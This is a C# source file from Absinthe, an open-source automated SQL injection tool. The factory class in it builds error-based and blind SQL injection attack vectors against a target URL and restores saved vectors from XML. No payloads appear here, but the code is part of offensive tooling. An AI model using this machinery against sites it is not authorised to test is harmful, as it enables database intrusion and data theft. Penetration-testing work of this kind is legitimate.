//   Absinthe Core - The Automated SQL Injection Library
//   This software is Copyright (C) 2004-2007  nummish, 0x90.org
//   $Id: AttackVectorFactory.cs,v 1.9 2006/02/13 06:47:38 nummish Exp $
//
//   This program is free software; you can redistribute it and/or modify
//   it under the terms of the GNU General Public License as published by
//   the Free Software Foundation; either version 2 of the License, or
//   (at your option) any later version.
//
//   This program is distributed in the hope that it will be useful,
//   but WITHOUT ANY WARRANTY; without even the implied warranty of
//   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//   GNU General Public License for more details.
//
//   You should have received a copy of the GNU General Public License
//   along with this program; if not, write to the Free Software
//   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

using System;
using System.Data;
using System.Xml;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;

namespace Absinthe.Core
{
	///<summary>Used as a factory class to generate an attack vector object</summary>
	public class AttackVectorFactory
	{  
        /// <summary>Event used to bubble up status messages to the user</summary>
		public event UserEvents.UserStatusEventHandler UserStatus;
		 
		private void BubbleUserStatus(string UserStatusMessage)
		{
			if (UserStatus != null)
				UserStatus(UserStatusMessage);
		}

        /// <summary>The options for the injection</summary>
		public InjectionOptions Options
		{
			get
			{
				return _Options;
			}
		} private InjectionOptions _Options;

        /// <summary>The parameters for the injection</summary>
		public NameValueCollection AttackParams
		{
			get
			{
				return _AttackParams;
			}
		} private NameValueCollection _AttackParams;

        /// <summary>The text used at the specific injection parameter</summary>
		public string VectorBuffer
		{
			get
			{
				return _VectorBuffer;
			}
		} private string _VectorBuffer;

        /// <summary>The name of the parameter that is injectable</summary>
		public string VectorName
		{
			get
			{
				return _VectorName;
			}
		} private string _VectorName;

        /// <summary>The url of the injectable target</summary>
		public string TargetUrl
		{
			get
			{
				return _TargetURL;
			}
		} private string _TargetURL;

        /// <summary>Indicates if the connection method is a POST</summary>
		public bool isPost
		{
			get
			{
				return _Method.ToUpper().Equals("POST");
			}
		} private string _Method;

		///<summary>Public Constructor for instantiation</summary>
		///<param name="URL">The URL of the attack target</param>
		///<param name="VectorName">The name of the injectable parameter</param>
		///<param name="VectorBuffer">The default value of the injectable parameter</param>
		///<param name="AdditionalParams">Any additional parameters to be sent but not used as part of the injection</param>
		///<param name="Method">The form action method to use during the injection</param>
		///<param name="Options">The InjectionOptions to be used during the attack</param>
		public AttackVectorFactory(string URL, string VectorName, string VectorBuffer, NameValueCollection AdditionalParams, string Method, 
			InjectionOptions Options)
		{
			httpConnect.UserStatus += new UserEvents.UserStatusEventHandler(BubbleUserStatus);
			_Options = Options;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method, Options.TerminateQuery);
		}

		///<summary>Public Constructor for instantiation</summary>
		///<param name="URL">The URL of the attack target</param>
		///<param name="VectorName">The name of the injectable parameter</param>
		///<param name="VectorBuffer">The default value of the injectable parameter</param>
		///<param name="FormParams">Any additional parameters to be sent but not used as part of the injection</param>
		///<param name="Method">The form action method to use during the injection</param>
		///<param name="Options">The InjectionOptions to be used during the attack</param>
		public AttackVectorFactory(string URL, string VectorName, string VectorBuffer, Hashtable FormParams, string Method,
				InjectionOptions Options)
		{
			httpConnect.UserStatus += new UserEvents.UserStatusEventHandler(BubbleUserStatus);			
			NameValueCollection AdditionalParams = PrepAdditionalParams(FormParams);
			_Options = Options;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method, Options.TerminateQuery);
		}

		private NameValueCollection PrepAdditionalParams(Hashtable FormParams)
		{
			NameValueCollection retVal = new NameValueCollection();

			foreach (object Key in FormParams.Keys)
			{
                GlobalDS.FormParam Param = (GlobalDS.FormParam)FormParams[Key];
				retVal.Add(Param.Name, Param.DefaultValue);	
			}
			return retVal;
		}
		
		private void Initialize(string URL, string VectorName, string VectorBuffer, NameValueCollection AdditionalParams, string Method, bool TerminateQuery)
		{
			_Method = Method.ToUpper();
			_TargetURL = URL;
			_VectorName = VectorName;
			_VectorBuffer = VectorBuffer;
			_AttackParams = AdditionalParams;
		}
		
		/// <summary>Generate a new SQL Error based attack vector.</summary>
		/// <param name="PluginUsed">The Error based plugin to use in the new AttackVector</param>
		/// <returns>A SQL Error attack vector that will use the given plugin.</returns>
		public SqlErrorAttackVector BuildSqlErrorAttackVector(IErrorPlugin PluginUsed)
		{
			SqlErrorAttackVector eav = new SqlErrorAttackVector(_TargetURL, _VectorName, _VectorBuffer, _AttackParams, _Method, PluginUsed, (ErrorInjectionOptions) _Options);
			eav.UserStatus += new UserEvents.UserStatusEventHandler(BubbleUserStatus);
			eav.Initialize();
			eav.UserStatus -= new UserEvents.UserStatusEventHandler(BubbleUserStatus);
			return eav;

		}
		 
		///<summary>Creates a BlindSqlAttackVector object</summary>
		///<param name="Tolerance">The percentage tolerance band to use for comparing signatures</param>
		///<param name="PluginUsed">The plugin being used for this injection</param>
		///<returns>An initialized BlindSqlAttackVector</returns>
		public BlindSqlAttackVector BuildBlindSqlAttackVector(float Tolerance, IBlindPlugin PluginUsed)
		{
			((BlindInjectionOptions) _Options).Tolerance = Tolerance;
			BlindSqlAttackVector bav = new BlindSqlAttackVector(_TargetURL, _VectorName, _VectorBuffer, _AttackParams, _Method, PluginUsed, (BlindInjectionOptions) _Options);
			bav.UserStatus += new UserEvents.UserStatusEventHandler(BubbleUserStatus);
			bav.Initialize();
			bav.UserStatus -= new UserEvents.UserStatusEventHandler(BubbleUserStatus);
			return bav;
		}
		 
		///<summary>Rebuilds an AttackVector from it's saved XML format</summary>
		///<param name="VectorNode">The root node of the Attack Vector information</param>
		///<param name="opts">The options for this injection</param>
        /// <param name="PluginUsed">The current plugin being used for this injection</param>
		///<returns>An initialized AttackVector</returns>
		public AttackVector BuildFromXml(XmlNode VectorNode, InjectionOptions opts, IPlugin PluginUsed)
		{
			string VectorType;
			GlobalDS.ExploitType ActualVectorType;

			if (VectorNode.Attributes["type"] != null)
			{
				VectorType = VectorNode.Attributes["type"].InnerText;
				if (!System.Enum.IsDefined(typeof(GlobalDS.ExploitType), VectorType)) VectorType = GlobalDS.ExploitType.Undefined.ToString();
				
				ActualVectorType = (GlobalDS.ExploitType) System.Enum.Parse(typeof(GlobalDS.ExploitType), VectorType);
				
				opts.Cookies = _Options.Cookies;
				opts.WebProxies = _Options.WebProxies;

				if (VectorNode.Attributes["PostBuffer"] != null)  opts.AppendedQuery = VectorNode.Attributes["PostBuffer"].InnerText;

				switch(ActualVectorType)
				{
 
					case GlobalDS.ExploitType.ErrorBasedTSQL:
						return DeserializeSqlErrorAttackVectorXml(VectorNode, (IErrorPlugin) PluginUsed);						
 					case GlobalDS.ExploitType.BlindSQLInjection:
						return DeserializeBlindSqlAttackVectorXml(VectorNode, (BlindInjectionOptions) opts, (IBlindPlugin) PluginUsed);
					default:
						// During Dev I'll use Blind MS Sql
						return DeserializeBlindSqlAttackVectorXml(VectorNode, (BlindInjectionOptions) opts, (IBlindPlugin) PluginUsed);						
				}
			}

			return null;
		}
		 
		private BlindSqlAttackVector DeserializeBlindSqlAttackVectorXml(XmlNode VectorNode, BlindInjectionOptions opts, IBlindPlugin PluginUsed)
		{
			double[] TrueSig = null, FalseSig = null;
			int[] TrueFilter = null, FalseFilter = null;

			foreach (XmlNode n in VectorNode.ChildNodes)
			{
				switch (n.Name)
				{
					case "truepage":
						//_ParentOutput("Deserializing True signature.. ");
						TrueSig = ExtractSignatureFromXml(n);
						break;
					case "falsepage":
						//_ParentOutput("Deserializing False signature.. ");
						FalseSig = ExtractSignatureFromXml(n);
						break;
					case "truefilter":
						//_ParentOutput("Deserializing True Filter.. ");
						TrueFilter = ExtractFilterFromXml(n);
						break;
					case "falsefilter":
						//_ParentOutput("Deserializing False filter.. ");
						FalseFilter = ExtractFilterFromXml(n);
						break;
				}
			}

			if (TrueSig == null || FalseSig == null || TrueFilter == null || FalseFilter == null) return null;
			
			string Name = String.Empty;
			string Buffer = String.Empty;

			if (VectorNode.Attributes["Delimiter"] != null) ((BlindInjectionOptions) opts).Delimiter = VectorNode.Attributes["Delimiter"].InnerText;
			if (VectorNode.Attributes["tolerance"] != null) opts.Tolerance = System.Single.Parse(VectorNode.Attributes["tolerance"].InnerText);
			if (VectorNode.Attributes["name"] != null) Name = VectorNode.Attributes["name"].InnerText;
			if (VectorNode.Attributes["buffer"] != null) Buffer = VectorNode.Attributes["buffer"].InnerText;
			if (VectorNode.Attributes["InjectAsString"] != null)  opts.InjectAsString = System.Boolean.Parse(VectorNode.Attributes["InjectAsString"].InnerText);
 
			return new BlindSqlAttackVector(_TargetURL, Name, Buffer, _AttackParams, _Method, PluginUsed, TrueSig, FalseSig, TrueFilter, FalseFilter, opts);
		}
	 
		private int[] ExtractFilterFromXml(XmlNode FilterNode)
		{
		    List<int> RetVal = new List<int>();
			
			XmlNodeList FilterElements = FilterNode.SelectNodes("filter-item");	

			if (FilterElements.Count > 0)
			{
				foreach (XmlNode ele in FilterElements)
				{
					RetVal.Add(System.Int32.Parse(ele.InnerText));
				}
			}
			return RetVal.ToArray();
		}
		 
		private double[] ExtractSignatureFromXml(XmlNode SigNode)
		{
			List<double> RetVal = new List<double>();

			XmlNodeList SignatureElements = SigNode.SelectNodes("signature-item");
			
			if (SignatureElements.Count > 0)
			{
				foreach (XmlNode ele in SignatureElements)
				{
					RetVal.Add(System.Double.Parse(ele.InnerText));
				}
			}

			return RetVal.ToArray();
		}
		 
		private SqlErrorAttackVector DeserializeSqlErrorAttackVectorXml(XmlNode VectorNode, IErrorPlugin PluginUsed)
		{
			List<GlobalDS.Field> ElementList = new List<GlobalDS.Field>();

			XmlNodeList AttackElements = VectorNode.SelectNodes("entry");

			if (AttackElements.Count > 0)
			{
				foreach (XmlNode ele in AttackElements)
				{
					GlobalDS.Field NewField = new GlobalDS.Field();
					string fieldname = "";

					if (ele.Attributes["field"] != null)
					{
						fieldname = ele.Attributes["field"].InnerText;
						if (ele.Attributes["table"] != null)
						{
							fieldname = ele.Attributes["table"].InnerText + "." + fieldname;
						}

						NewField.FieldName = fieldname;
					}

					if (ele.Attributes["datatype"] != null)
					{
						NewField.DataType = (SqlDbType) System.Enum.Parse(typeof(SqlDbType), ele.Attributes["datatype"].InnerText);
					}

					ElementList.Add(NewField);
				}
			}

			string Name = "";
			string Buffer = "";

			if (VectorNode.Attributes["name"] != null){Name = VectorNode.Attributes["name"].InnerText;}
			if (VectorNode.Attributes["buffer"] != null){Buffer = VectorNode.Attributes["buffer"].InnerText;}

			return new SqlErrorAttackVector(_TargetURL, _Method, ElementList, Name, Buffer, _AttackParams, PluginUsed);
		}		 
	}	 
}
